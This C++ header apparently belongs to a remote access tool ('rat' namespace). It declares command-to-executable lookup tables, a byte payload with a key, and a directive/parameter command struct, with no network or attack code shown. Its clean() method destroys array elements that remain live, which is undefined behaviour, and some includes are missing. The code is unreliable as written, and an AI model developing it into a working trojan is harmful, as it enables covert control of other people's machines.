#pragma once
#include <filesystem>
#include <cstdlib>
#include <unordered_map>
#include <algorithm>
#include <iostream>
#include <string>
#include <vector>
#include "rat/media.hpp"
#include <filesystem>

//The number of local stored commands can only be 255 at maximum and even less if needed;
namespace rat::handler{


struct CommandPathPair {
    std::string command;
    std::filesystem::path path;
};

template<std::size_t Capacity>
struct CommandPathStaticArray{
    std::size_t size = 0;
    CommandPathPair array[Capacity];

    constexpr std::size_t capacity() const noexcept { return Capacity; }

    bool push_back(std::string&& arg_Command, std::filesystem::path&& arg_Path) {
        if (size < Capacity) {
            array[size++] = { std::move(arg_Command), std::move(arg_Path) }; // move
            return true;
        }
        return false;
    }

    bool push_back(const std::string& arg_Command, const std::filesystem::path& arg_Path) {
        if (size < Capacity) {
            array[size++] = { arg_Command, arg_Path }; // copy
            return true;
        }
        return false;
    }

    void clean() noexcept {
        for (std::size_t i = 0; i < size; ++i) {
            array[i].~CommandPathPair(); // call destructor explicitly
        }
        size = 0;
    }
    
    CommandPathPair& operator[](std::size_t i) { return array[i]; }
    const CommandPathPair& operator[](std::size_t i) const { return array[i]; }

    // Iterators for range-for
    CommandPathPair* begin() noexcept { return array; }
    CommandPathPair* end() noexcept { return array + size; }
    const CommandPathPair* begin() const noexcept { return array; }
    const CommandPathPair* end() const noexcept { return array + size; }

    CommandPathPair* find(const std::string& key) noexcept {
        for (std::size_t i = 0; i < size; ++i) {
            if (array[i].command == key) {
                return &array[i];
            }
        }
        return nullptr; // not found
    }

    const CommandPathPair* find(const std::string& key) const noexcept {
        for (std::size_t i = 0; i < size; ++i) {
            if (array[i].command == key) {
                return &array[i];
            }
        }
        return nullptr;
    }
    std::optional<std::filesystem::path> findPathOfCommand(const std::string& arg_Command) const noexcept {
    		if (auto* pair = this->find(arg_Command)) {
        		return pair->path;
    		}
    		return std::nullopt;
    }
};


struct RatState {
    CommandPathStaticArray<64> command_path_map;  // fixed-capacity container
    CommandPathStaticArray<32> user_defined_command_path_map;

    std::vector<uint8_t> payload;

    std::string payload_key;

    RatState();
    ~RatState() {};
    
    std::filesystem::path findExecutable(const std::string& arg_Tool) const;
    std::filesystem::path getToolPath(const std::string& arg_Name) const;
    bool hasTool(const std::string& arg_Tool) const;
    void addCommand(const std::string& arg_Key, const std::string& arg_Literal);
    std::string getCommand(const std::string& arg_Key) const;
    std::string listDynamicTools() const;
};

struct Command {
    std::string directive;
    std::vector<std::string> parameters;

    Command() = default;   // <--- add this
    Command(const std::string& arg_Directive, const std::vector<std::string>& arg_Parameters)
        : directive(arg_Directive), parameters(arg_Parameters) {}
};

} // namespace rat
